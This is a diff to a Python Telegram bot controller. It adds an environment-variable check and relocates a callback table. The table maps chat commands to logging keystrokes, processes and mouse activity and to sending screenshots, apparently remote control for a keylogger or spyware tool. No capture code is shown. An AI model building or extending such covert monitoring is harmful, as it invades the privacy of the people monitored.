@@ -22,7 +22,13 @@ class TelegramController(BaseController):
         self.callbacks = dict()
 
         token = os.getenv("TELEGRAM_TOKEN")
-        chatID = int(os.getenv("TELEGRAM_ID"))
+        chatID = os.getenv("TELEGRAM_ID")
+
+        try:
+            assert token != None and chatID != None
+        except AssertionError:
+            logger.critical("Environment variables not set!", exc_info=True)
+            quit(1)
 
         try:
             self.bot = TelegramWrapper(token, chatID)
@@ -63,18 +69,6 @@ class TelegramController(BaseController):
     def connectSlots(self):
         self.bot.SIG_msgReceived.connect(self, "_handleMessage")
 
-    def initCallbacks(self):
-        self.callbacks = {
-            "start": self._onStartProgram,
-            "stop": self._onStopProgram,
-            "help": self._sendHelpText,
-            "log keys": self._onLogKeys,
-            "log proc": self._onLogProc,
-            "log mouse": self._onLogMouse,
-            "log master": self._onLogMaster,
-            "send ss": self._onSendScreenshot
-        }
-
     def _handleMessage(self, message: str):
         message = message.lower()
         try:
@@ -90,6 +84,18 @@ class TelegramController(BaseController):
     # -----------------------------------------------------------------------
     # Callbacks
     # -----------------------------------------------------------------------
+    def initCallbacks(self):
+        self.callbacks = {
+            "start": self._onStartProgram,
+            "stop": self._onStopProgram,
+            "help": self._sendHelpText,
+            "log keys": self._onLogKeys,
+            "log proc": self._onLogProc,
+            "log mouse": self._onLogMouse,
+            "log master": self._onLogMaster,
+            "send ss": self._onSendScreenshot
+        }
+
     def _sendHelpText(self):
         self.bot.sendText(msgs.HELP, parse_mode="Markdown")
 
